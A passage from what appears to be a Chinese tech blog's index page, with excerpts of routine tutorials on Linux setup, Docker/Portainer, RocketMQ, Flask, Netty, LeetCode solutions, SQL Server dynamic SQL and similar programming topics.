# 查看Linux发布版本。我这里的 版本为 Ubuntu 20.04.6 LTS lsb_release -a # No LSB modules are available. # Distributor ID: Ubuntu # Description: Ubuntu 20.04.6 LTS # Release: 20.04 # Codename: focal # 查看内核版本号 和 CPU 架构。我这里的CPU架构为 x86_64 uname -a # Linux linyajun-Ubuntu18 5.4.0-150-generic #167~18.04.1-Ubuntu SMP Wed May 24 00:51:42 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux 2. 安装 将下载后的压缩文件进行解压 /usr/local/mysql 目录下，这里需要在/usr/local目录下创建一个名为mysql的目录
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/16ef653cd2a8de5ade2024b823d42f02/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/77d99b51d98cea4b5c51e95282bf06fa/" rel="bookmark">
			ubuntu挂载新分区或者新磁盘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 创建要挂载磁盘的目录（最好是新的）
sudo mkdir /code
取消新分区或者新磁盘的挂载 (如果有的话)
sudo umount /media/zzq/data （可以根据应用中的磁盘确定其位置，或者命令
sudo fdisk -l 查看磁盘信息也可以）
查看UUID号
sudo blkid 修改 /etc/fstab 文件
sudo vi /etc/fstab 添加下面这行 UUID=&lt;your_partition_uuid&gt; /code ext4 defaults 0 2 保存并关闭文件。
重新挂载 sudo mount -a 确保挂载成功，检查新的挂载点是否包含原先 磁盘 中的数据
sudo update-grub #更新引导 （可能非必须） 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c88d8169de8cb76bf5ccb1bedab9cbac/" rel="bookmark">
			华为Harmony——ArkTs语言
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、简单示例二、声明式UI描述创建组件无参有参数 配置属性配置事件配置子组件 三、自定义组件基本用法基本结构成员函数/变量 一、简单示例 我们以一个具体的示例来说明ArkTS的基本组成。如下图所示，当开发者点击按钮时，文本内容从“Hello World”变为“Hello ArkUI”。
装饰器： 用于装饰类、结构、方法以及变量，并赋予其特殊的含义。如上述示例中@Entry、@Component和@State都是装饰器，@Component表示自定义组件，@Entry表示该自定义组件为入口组件，@State表示组件中的状态变量，状态变量变化会触发UI刷新。UI描述：以声明式的方式来描述UI的结构，例如build()方法中的代码块。自定义组件：可复用的UI单元，可组合其他组件，如上述被@Component装饰的struct Hello。系统组件：ArkUI框架中默认内置的基础和容器组件，可直接被开发者调用，比如示例中的Column、Text、Divider、Button。属性方法：组件可以通过链式调用配置多项属性，如fontSize()、width()、height()、backgroundColor()等。事件方法：组件可以通过链式调用设置多个事件的响应逻辑，如跟随在Button后面的onClick()。 二、声明式UI描述 创建组件 根据组件构造方法的不同，创建组件包含有参数和无参数两种方式。
无参 如果组件的接口定义没有包含必选构造参数，则组件后面的“()”不需要配置任何内容。例如，Divider组件不包含构造参数：
Column() { Text('item 1') Divider() Text('item 2') } 有参数 如果组件的接口定义包含构造参数，则在组件后面的“()”配置相应参数。
Image组件的必选参数src。 Image('https://xyz/test.jpg') Text组件的非必选参数content。 // string类型的参数 Text('test') // $r形式引入应用资源，可应用于多语言场景 Text($r('app.string.title_value')) // 无参数形式 Text() 变量或表达式也可以用于参数赋值，其中表达式返回的结果类型必须满足参数类型要求。
例如，设置变量或表达式来构造Image和Text组件的参数。 Image(this.imagePath) Image('https://' + this.imageUrl) Text(`count: ${this.count}`) 配置属性 属性方法以“.”链式调用的方式配置系统组件的样式和其他属性，建议每个属性方法单独写一行。
配置Text组件的字体大小 Text('test') .fontSize(12) 配置组件的多个属性。 Image('test.jpg') .alt('error.jpg') .width(100) .height(100) 除了直接传递常量参数外，还可以传递变量或表达式。 Text('hello') .fontSize(this.size) Image('test.jpg') .width(this.count % 2 === 0 ? 100 : 200) .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c88d8169de8cb76bf5ccb1bedab9cbac/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/460ad72a1018af517879d73730f29403/" rel="bookmark">
			【分治算法】之汉诺塔问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		汉诺塔问题 三根柱子 把A柱子上的盘子全部挪到C上，且每次挪动的时候 小的必须在大的上面
分治算法的思想; 分：把一个大问题拆成若干个小的子问题，每个子问题相互独立；
治：求解每个子问题的（递归）；
并：把子问题的解合并起来就是大问题的解；
汉诺塔拆分： 我们每次把这些个盘子看成两部分；
- 第一部分： 最下面的一个大的作为一部分，先把他放在C上； - 第二部分 除去最大的剩下的整体作为一部份，再把他放在c上； ### 步骤先把第二部分移动到B上；然后第一部分就可以取出来放到C上；然后再把第二部分移动到C上； 所以剩下的就是递归解决每次拆分的两个部分即可。
package 算法.分治算法.汉诺塔问题; //递归求解子问题 public class HanuoTower { // A B C 三根柱子 public static void main(String[] args) { move(3,'A','B','C'); } /** * @param num 盘的数目 * @param a a、b、c三根柱子 * @param b 初始时候盘子都在A上 要把全部盘子移动到C上 * @param c 每次移动的都是: 相应柱子最上面的盘子 */ public static void move(int num, char a, char b, char c) { //一、如果只有一个盘 则从A—&gt;C if (num==1){ System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/460ad72a1018af517879d73730f29403/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e4dec6057e3f763a357dfec74ec28a9/" rel="bookmark">
			如何在本地安装Flask并将其web界面发布到公网上远程访问协同开发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言
1. 安装部署Flask
2. 安装Cpolar内网穿透
3. 配置Flask的web界面公网访问地址
4. 公网远程访问Flask的web界面
前言 本篇文章讲解如何在本地安装Flask，以及如何将其web界面发布到公网上并进行远程访问。
Flask是目前十分流行的web框架，采用Python编程语言来实现相关功能。较其他同类型框架更为灵活、轻便、安全且容易上手。它可以很好地结合MVC模式进行开发，开发人员分工合作，小型团队在短时间内就可以完成功能丰富的中小型网站或Web服务的实现。
另外，Flask还有很强的定制性，用户可以根据自己的需求来添加相应的功能，在保持核心功能简单的同时实现功能的丰富与扩展，其强大的插件库可以让用户实现个性化的网站定制，开发出功能强大的网站。
1. 安装部署Flask 本篇文章代码使用 Python3 运行
安装环境：需要在电脑上安装 Python3 和 pip3。建议安装最新版本
检查是否有安装了pip的可用Python，查看Python和pip版本：
C:&gt; py --version Python 3.N.N C:&gt; py -m pip --version pip X.Y.Z from ... (python 3.N.N) 使用pip安装和更新：
$ pip install -U Flask 在VS Code里 FLASK下新建一个文件，名字为 app.py
粘贴下面命令，并保存
# save this as app.py from flask import Flask ​ app = Flask(__name__) ​ @app.route("/") def hello(): return "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0e4dec6057e3f763a357dfec74ec28a9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60edcffcaf8c6e8248b257e6a26ee0dc/" rel="bookmark">
			vscode远程调试 bash 文件的 launch.json写法示例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		{
"version": "0.2.0",
"configurations": [
{
"name": "Debug Bash Script",
"type": "node",
"request": "launch",
"program": "${workspaceFolder}/ bash_name.sh",
"args": ["pacs"],
"cwd": "${workspaceFolder}",
"runtimeExecutable": "/bin/bash", // Specify the path to your Bash executable
"runtimeArgs": ["-l"],
"env": {
"CUDA_VISIBLE_DEVICES": "0",
"DATA": "${workspaceFolder}/data"
},
"console": "integratedTerminal"
}
]
}
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a7b269624161ed1852d418a1f35b3aa/" rel="bookmark">
			Leetcod面试经典150题刷题记录 —— 矩阵篇
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		矩阵篇 1. 有效的数独2. 螺旋矩阵Python 3. 旋转图像Python额外开辟数组空间原地置换法 4. 矩阵置零5. 生命游戏Python 1. 有效的数独 题目链接：有效的数独 - leetcode
题目描述：
请你判断一个 9 x 9 的数独是否有效。只需要 根据以下规则 ，验证已经填入的数字是否有效即可。
数字 1-9 在每一行只能出现一次。
数字 1-9 在每一列只能出现一次。
数字 1-9 在每一个以粗实线分隔的 3x3 宫内只能出现一次。（请参考示例图）
注意：
一个有效的数独（部分已被填充）不一定是可解的。
只需要根据以上规则，验证已经填入的数字是否有效即可。
空白格用 '.' 表示。
题目归纳：
略
class Solution: def isValidSudoku(self, board: List[List[str]]) -&gt; bool: # (1) board的行数为m，列数为n，m = n = 9 # (2) 该求解算法应只遍历board一次 # (3) 遍历过程更新hashtable的计数，并判断是否满足有效数独 # (4) 0&lt;=i,j&lt;9，故对于(i,j)单元格，该单元格所在的小九宫格，其对应行数为i//3，列数为j//3，均向下取整, 0&lt;=i//3, j//3 &lt;9 # (5) 创建二维数组 rows与columns，分别记录每行、每列中，每个数字的出现次数 # (6) 创建三维数组 subboxes，记录每个小九宫格中，每个数字的出现次数 # 其中rows[i][index]表示数独i行j列单元格所在 行，数字index+1出现的次数 # 其中columns[j][index]表示数独i行j列单元格所在 列，数字index+1出现的次数 # 其中subboxes[i//3][j//3][index]表示数独i行j列单元格所在 小九宫格，数字index+1出现的次数 # 其中 1&lt;= index+1 &lt;= 9 # (7) 若board[i][j]非空，其字符串值为数字n，则将 # rows[i][n-1] += 1 # columns[j][n-1] += 1 # subboxes[i//3][j//3][n-1] += 1 # 若更新后的计数 &gt;1，则不符合有效数独条件，返回false # 若更新后的计数 &lt;=1，则符合有效数独条件，返回true rows = [[0] * 9 for _ in range(9)] columns = [[0] * 9 for _ in range(9)] subboxes = [[[0] * 9 for _ in range(3)] for _ in range(3)] for i in range(9): for j in range(9): ch = board[i][j] if ch !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7a7b269624161ed1852d418a1f35b3aa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0dbcf77b90c06366a16ac16839d4a76e/" rel="bookmark">
			在Portainer创建Nginx容器并部署Web静态站点实现公网访问
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🔥博客主页： 小羊失眠啦.
🎥系列专栏：《C语言》 《数据结构》 《Linux》《Cpolar》
❤️感谢大家点赞👍收藏⭐评论✍️
前些天发现了一个巨牛的人工智能学习网站，通俗易懂，风趣幽默，忍不住分享一下给大家。点击跳转到网站。
文章目录 前言1. 安装Portainer1.1 访问Portainer Web界面 2. 使用Portainer创建Nginx容器3. 将Web静态站点实现公网访问4. 配置Web站点公网访问地址4.1公网访问Web站点 5. 固定Web静态站点公网地址6. 固定公网地址访问Web静态站点 前言 Portainer是一个开源的Docker轻量级可视化工具，它提供了一个直观的Web界面，让你轻松管理和监控Docker容器、镜像和网络等。之前在文章《Linux Docker 图形化工具 Portainer远程访问》中我们讲了如何使用Docker部署一个Portainer，并结合cpolar内网穿透实现了公网访问成功。本篇文章教大家如何在Portainer创建Nginx容器，并且部署一个静态站点实现公网访问。
1. 安装Portainer 使用docker部署一个Portainer，首先拉取Portainer镜像
docker pull portainer/portainer 然后运行容器，其中: 8098端口是我们要访问的Portainer Web界面
docker run -d -p 8098:9000 --restart always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce 1.1 访问Portainer Web界面 在浏览器中输入http://localhost:8098 或 http://服务器IP+8098端口号，即可看到Portainer管理界面。
第一次访问时，你需要创建一个管理员账号。填写所需的信息，并设置一个强密码。然后点击"Create user"按钮继续。
2. 使用Portainer创建Nginx容器 登录成功后，你将看到Portainer的控制面板。
本篇文章举例: 这里部署的Web站点是我制作的一个三维立体图像web页面。
在左侧导航栏中，选择 Home , 点击 local
然后选中 Containers，再点击右上角的 Add container
进入新界面：
Name输入three（可以自定义填写）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0dbcf77b90c06366a16ac16839d4a76e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ed4f9c4691ede5f91ce42aeceebbf391/" rel="bookmark">
			PTA 数组元素循环右移问题（C语言）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题意： 一个数组A中存有N（&gt;0）个整数，在不允许使用另外数组的前提下，将每个整数循环向右移M（≥0）个位置，即将A中的数据由（A0​A1​⋯AN−1​）变换为（AN−M​⋯AN−1​A0​A1​⋯AN−M−1​）（最后M个数循环移至最前面的M个位置）。如果需要考虑程序移动数据的次数尽量少，要如何设计移动的方法？
输入格式: 每个输入包含一个测试用例，第1行输入N（1≤N≤100）和M（≥0）；第2行输入N个整数，之间用空格分隔。
输出格式: 在一行中输出循环右移M位以后的整数序列，之间用空格分隔，序列结尾不能有多余空格。
输入样例: 6 2 1 2 3 4 5 6 输出样例: 5 6 1 2 3 4 代码长度限制
16 KB
时间限制
400 ms
内存限制
64 MB
代码如下： #include &lt;stdio.h&gt; void test(int a[],int m,int n){ if(n%m==0) return; else{ if(n&gt;m){ while(n&gt;m) n-=m; } int b[m]; for(int i=0;i&lt;m;i++){ b[(i+n)%m]=a[i]; } for(int i=0;i&lt;m;i++){ a[i]=b[i]; } } } int main(){ int m,n,cnt=0;; scanf("%d %d",&amp;m,&amp;n); int a[m],b[m]; for(int i=0;i&lt;m;i++){ scanf("%d",&amp;a[i]); } test(a,m,n); for(int i=0;i&lt;m;i++){ printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ed4f9c4691ede5f91ce42aeceebbf391/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aedd693025113b62dc146801fc36ff16/" rel="bookmark">
			Torch 加速
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 loss.item() 1. 费时
loss.backward() loss_item = loss.item() # todo loss.item() 这个比较费时间 0.2743 秒 2. 省时
loss_item = loss.item() #todo 把它 移到 loss.backward() 前面，这个操作只需要 0.00027 秒 loss.backward() Index d_inv[torch.isinf(d_inv)] = 0.0 # todo 这个超级费时间 大约 0.04秒 Top-k 替换 argsort torch.argsort(pc1_sampling_confidence, dim=-1, descending=True)[:, :64] # 费时 torch.topk(pc1_sampling_confidence, 64, dim=-1) # 省时 申明对象 torch.arange(B, dtype=torch.long, device="cuda") # 省时 torch.arange(B, dtype=torch.long).to("cuda") # 费时 A.to("cuda") 与 A.cuda() 是一样的时间 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac27c850bd8a58d93157d17a52a1d767/" rel="bookmark">
			基于Netty构建Websocket服务端
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		除了构建TCP和UDP服务器和客户端，Netty还可以用于构建WebSocket服务器。WebSocket是一种基于TCP协议的双向通信协议，可以在Web浏览器和Web服务器之间建立实时通信通道。下面是一个简单的示例，演示如何使用Netty构建一个WebSocket服务器。
项目目录：
引入pom依赖：
&lt;dependency&gt; &lt;groupId&gt;io.netty&lt;/groupId&gt; &lt;artifactId&gt;netty-all&lt;/artifactId&gt; &lt;version&gt;4.1.69.Final&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; 编写SocketServer：
package com.lzq.websocket.config; import com.lzq.websocket.handlers.WebSocketHandler; import io.netty.bootstrap.ServerBootstrap; import io.netty.channel.ChannelFuture; import io.netty.channel.ChannelInitializer; import io.netty.channel.ChannelPipeline; import io.netty.channel.EventLoopGroup; import io.netty.channel.nio.NioEventLoopGroup; import io.netty.channel.socket.SocketChannel; import io.netty.channel.socket.nio.NioServerSocketChannel; import io.netty.handler.codec.http.HttpObjectAggregator; import io.netty.handler.codec.http.HttpServerCodec; import io.netty.handler.codec.http.websocketx.WebSocketServerProtocolHandler; import io.netty.handler.timeout.ReadTimeoutHandler; import lombok.extern.slf4j.Slf4j; import org.springframework.boot.CommandLineRunner; import org.springframework.context.annotation.Configuration; import java.util.concurrent.TimeUnit; @Slf4j @Configuration public class WebSocketConfig implements CommandLineRunner { private static final Integer PORT = 8888; @Override public void run(String... args) throws Exception { new WebSocketConfig().
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ac27c850bd8a58d93157d17a52a1d767/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e0fce8a4083342c8f4839f694867eb7/" rel="bookmark">
			FFmpeg windows安装与使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		FFmpeg下载：
1、进入ffmpeg官网，点击“Download”。官网地址：FFmpeg
2、选择对应环境的编译工具，如下载windows环境下的ffmpeg编译工具
3、点击下载编译好的ffmpeg工具
FFmpeg使用：
1、将ffmpeg编译的bin文件复制出来，在文件浏览栏输入cmd，即可使用ffmpeg命令。
2、使用ffmpeg将mp4文件转成mov文件
FFmpeg命令大全：
【FFmpeg实战】FFMPEG常用命令行 - 知乎
FFmpeg-主要命令梳理 - 知乎
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d3b5aa8dd93fa806a14b45a7a0f139a6/" rel="bookmark">
			博客引擎 Hexo 入门介绍&#43;安装笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Hexo Hexo is a fast, simple &amp; powerful blog framework.
一直使用的是 jekyll，文章越写越多，不太好管理。是时候换个博客尝试一下。
Prepare blog zh_CN
本机为 MAC。不同系统会略有不同，但是大同小异。
Node.js 必须。
作用：用来生成静态页面的。
houbinbindeMacBook-Pro:~ houbinbin$ node -v v6.2.2 Git 必须。
作用：代码仓库管理。
houbinbindeMacBook-Pro:~ houbinbin$ git --version git version 2.8.1 Github 申请个账号。我相信你应该知道。
Install 下载安装 hexo 找一个你想放置blog的文件夹，执行：
sudo npm install -g hexo-cli 实际操作：
houbinbindeMacBook-Pro:fork houbinbin$ pwd /Users/houbinbin/it/fork houbinbindeMacBook-Pro:fork houbinbin$ npm install -g hexo-cli fetchMetadata → network 。。。。 测试 等待下载完成。输入命令 hexo
houbinbindeMacBook-Pro:fork houbinbin$ hexo Usage: hexo &lt;command&gt; Commands: help Get help on a command.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d3b5aa8dd93fa806a14b45a7a0f139a6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f6c277d3e44e8b8f78383f8a6e28d20/" rel="bookmark">
			RocketMQ部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		RocketMQ部署 1.部署方式 单节点master
主备
多主
多主多从（异步复制，同步双写）
2.部署方式优缺点 单节点
优点：部署与配置简单，方便管理，适合开发阶段使用
缺点：风险较大，一旦重启或者宕机时，会导致整个服务不可用，不建议线上环境使用
主备
优点：单台机器宕机不影响消息消费，保证消息能及时处理。
缺点：主节点宕机之后消息不能写入，只能消费。
多主
优点：配置简单，单个 master 宕机或重启维护对消息写入无影响，新消息将被写入到其他master。
缺点：单台机器宕机期间，这台机器上未被消费的消息在机器恢复之前不可订阅，不能消费，消息实时性会受到影响。
多主多从（异步复制，同步双写）
优点：某个master 宕机后，消费者仍然可以从 slave被消费，此过程对应用透明。不需要人工干预
缺点：部署与维护相对于其他方式复杂一点。
异步复制与同步双写的区别在于消息的延迟与性能高低，异步复制方式，主备有短暂消息延迟，毫秒级，新能高。同步双写方式主备消息无延迟，只有主备都写成功，才向应用返回成功，但是这样性能相比于异步复制略低，大约在10%左右。
以上master与slave配对是通过指定相同的brokerName参数来配对，master的BrokerId必须是0，slave 的BrokerId必须是大与0的数。另外一个master下面可以挂载多个slave，同一master下的多个slave通过指定不同的BrokerId来区分。
==注意==：RocketMQ有一个非常 弱智 高级的点，就是两个Broker监听端口listenPort的值相差必须大于等于2，这tm是人类能想到的设计吗 这个设计非常人性化，打发了我一下午的无聊时光。默认监听端口为10911，所以再起一个Broker的话，端口必须大于等于10913。==泰裤辣！！！==
3.部署 下载对应版本的RocketMQ
Apache RocketMQ
解压安装目录
unzip rocketmq-all-4.9.3-bin-release.zip 修改配置文件
#配置文件目录 cd /opt/rocketmq/conf/ #编辑配置文件 vim broker.conf 配置文件内容
#Broker对外服务的监听端口 listenPort=10911 #Broker的IP brokerIP1 = 127.0.0.1 #所属集群名字 brokerClusterName=rocketmq-cluster #broker名字，主从需要名字一致 brokerName=broker-a #0表示Master，大于0表示slave brokerId=0 #nameServer地址","分号分割 namesrvAddr=127.0.0.1:9876 #Broker 的角色 #- ASYNC_MASTER 异步复制Master #- SYNC_MASTER 同步双写Master #- SLAVE brokerRole=ASYNC_MASTER #刷盘方式 #- ASYNC_FLUSH 异步刷盘 #- SYNC_FLUSH 同步刷盘 flushDiskType=ASYNC_FLUSH #是否开启自动创建topic autoCreateTopicEnable=true #是否开启自动创建订阅组 autoCreateSubscriptionGroup=true #自动创建topic时，默认的队列数 defaultTopicQueueNums=4 #删除文件时间点，默认凌晨 4点 deleteWhen=04 #文件保留时间，默认 48 fileReservedTime=48 #commitLog每个文件的大小默认1G，1024 * 1024 * 1024 mapedFileSizeCommitLog=1073741824 #存储路径 storePathRootDir=/usr/local/rocketmq/store #log存储路径 storePathCommitLog=/usr/local/rocketmq/store/commitlog #消费队列存储路径 storePathConsumeQueue=/usr/local/rocketmq/store/consumequeue #消息索引存储路径 storePathIndex=/usr/local/rocketmq/store/index #checkpoint文件存储路径 storeCheckpoint=/usr/local/rocketmq/store/checkpoint #abort文件存储路径 abortFile=/usr/local/rocketmq/store/abort #限制的消息大小 maxMessageSize=65536 #是否开启acl aclEnable = true 开启ACL
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6f6c277d3e44e8b8f78383f8a6e28d20/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/322c45cd49915d10663f7490edfa76d8/" rel="bookmark">
			Spring Boot整合RocketMQ
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pom.xml导入RocketMQ依赖
&lt;dependency&gt; &lt;groupId&gt;org.apache.rocketmq&lt;/groupId&gt; &lt;artifactId&gt;rocketmq-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.2.2&lt;/version&gt; &lt;/dependency&gt; application.yml中添加配置
rocketmq: name-server: 127.0.0.1:9876 producer: group: x access-key: myaccesskey secret-key: mysecretKey send-message-timeout: 10000 tls-enable: true consumer: group: x access-key: myaccesskey secret-key: mysecretKey tls-enable: true 创建MQ工具类
public class MqUtil { private final RocketMQTemplate rocketMQTemplate; public MqUtil(RocketMQTemplate rocketMQTemplate) { this.rocketMQTemplate = rocketMQTemplate; } /** * 单条通知发送 * * @param topic 主题 * @param message 消息 */ public void convertAndSend(String topic, Object message) { rocketMQTemplate.convertAndSend(topic, message); } /** * 批量通知发送 * * @param topic 主题 * @param messages 消息集合 */ public &lt;T extends Message&lt;?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/322c45cd49915d10663f7490edfa76d8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a0afa22d1ca78f7a57f63b3036ba5d08/" rel="bookmark">
			sql server 拼接表名查询内容
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在 SQL Server 中，如果你希望根据某些条件来拼接表名并查询内容，你可以使用动态 SQL。动态 SQL 允许你构建包含变量的 SQL 语句，并在运行时执行。以下是一个简单的示例，演示如何在查询中拼接表名：
DECLARE @TableName NVARCHAR(100) = 'YourTableName'; DECLARE @SqlQuery NVARCHAR(MAX); SET @SqlQuery = 'SELECT * FROM ' + QUOTENAME(@TableName); -- 执行动态 SQL 查询 EXEC sp_executesql @SqlQuery; 在这个例子中，@TableName 是一个变量，存储了你希望查询的表名。然后，使用 SET @SqlQuery = 'SELECT * FROM ' + QUOTENAME(@TableName); 将表名拼接到查询字符串中。QUOTENAME 函数用于确保表名的合法性，以防止 SQL 注入攻击。
最后，使用 EXEC sp_executesql @SqlQuery; 执行动态 SQL 查询。请注意，在使用动态 SQL 时要格外小心，确保输入是可信任的，以防止安全风险。
如果你有特定的条件用于构建表名，你可以相应地调整上述例子中的逻辑。例如，你可以使用 IF 语句来根据条件选择不同的表名。
DECLARE @TableName NVARCHAR(100); IF (/* Your condition here */) SET @TableName = 'Table1'; ELSE SET @TableName = 'Table2'; DECLARE @SqlQuery NVARCHAR(MAX); SET @SqlQuery = 'SELECT * FROM ' + QUOTENAME(@TableName); EXEC sp_executesql @SqlQuery; 请根据你的具体需求进行适当的调整。同时，确保在使用动态 SQL 时注意安全性和性能方面的问题。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f417a8094123e7c56b66008bc20f2144/" rel="bookmark">
			振动试验的工装夹具（GB/T 2423.43-2008）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		但当试件体积较大，而且形状复杂时，这种固定方法显然很困难，这时需要制作夹具，让试件安装在夹具上然后把夹具牢固地固定在振动台面上，因此实际上夹具是试件与振动台面连接的过渡体，其功能是将振动台的振动和能量不失真的传递给试件。
振动试验夹具知识简介 (qq.com)
GB_T 2423.43-2008 - 道客巴巴 (doc88.com)
铁丝不是刚体。铁丝在受力作用下会发生形变，因此不是刚体。
在进行振动试验时，通常使用特殊的振动台或振动装置来产生振动，并将试件放置在振动台上进行测试。这些振动台或装置通常具有自己的固定装置或夹具，以确保试件在测试过程中保持稳定和不会移动。
铁丝是一种金属丝，通常用于固定或支持其他物体。然而，在振动试验中，使用铁丝固定试件可能会导致以下问题：
铁丝可能会在试件上产生不必要的摩擦或碰撞，从而影响试件的振动特性或导致试件损坏。铁丝的刚性和质量可能会导致试件在振动过程中产生共振或谐振，从而影响测试结果。铁丝可能无法提供足够的固定力，导致试件在振动过程中移动或跳动，从而影响测试结果。 因此，为了确保振动试验的准确性和可靠性，应该使用专门的固定装置或夹具来固定试件，而不是使用铁丝或其他非专业材料。这些固定装置或夹具可以根据试件的形状和尺寸进行定制，以确保试件在测试过程中保持稳定和不会移动。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/93b0179cc91855cab8b2b92ccf400617/" rel="bookmark">
			Ubuntu和Red Hat Enterprise Linux差异
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		由于Ubuntu（基于Debian）和Red Hat Enterprise Linux（RHEL，包括其衍生版本如CentOS和Fedora）是基于不同的Linux发行版，它们在命令行工具和管理上确实存在一些差异。但是，要列出所有差异是非常庞大且复杂的任务，因为有很多细节和特定情况需要考虑。然而，我可以总结一些常见的和重要的差异：
包管理 Ubuntu 使用的是 apt 或 dpkg 命令。
例如，安装软件包：sudo apt install [package]更新软件包列表：sudo apt update升级所有软件包：sudo apt upgrade RHEL 使用的是 yum 或 dnf（在最新版本中）。
安装软件包：sudo yum install [package] 或 sudo dnf install [package]更新软件包列表和软件包：sudo yum update 或 sudo dnf update 服务管理 Ubuntu 使用 systemd 系统和 systemctl 命令。
启动服务：sudo systemctl start [service]停止服务：sudo systemctl stop [service]查看服务状态：sudo systemctl status [service] RHEL 在早期版本中使用 init 脚本和 service 命令，但在最新版本中也转向了 systemd。
使用 systemd 时，命令与Ubuntu相同。早期版本使用：sudo service [service] start 网络配置 Ubuntu 的网络配置文件通常位于 /etc/network/interfaces 或使用 netplan（较新版本）。RHEL 的网络配置文件通常位于 /etc/sysconfig/network-scripts/ 目录中。 配置和日志文件的位置 Ubuntu 和 RHEL 在某些配置和日志文件的位置上有所不同，例如 Apache、Nginx 或其他服务的配置文件。 默认的文件系统结构 这两个系统在默认的文件系统结构上有细微的差别，尽管它们都遵循通用的Linux文件系统层次结构。 发行版特定的工具和命令 两个系统都有一些特定的工具和命令，这些工具和命令是为了适应它们自身的管理哲学和用户基础而设计的。 这只是一些基本的差异。要了解更详细和具体的差异，通常需要针对特定任务或系统组件进行比较。此外，随着新版本的发布，这些差异可能会发生变化。在具体的系统管理和使用方面，最好查阅每个发行版的官方文档来获得最准确的信息。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/93b0179cc91855cab8b2b92ccf400617/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/52549b29c1162e4f4f13e210ddfbc5cc/" rel="bookmark">
			芯科科技以卓越的企业发展和杰出的产品创新获得多项殊荣
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2023年共获颁全球及囯內近20个行业奖项
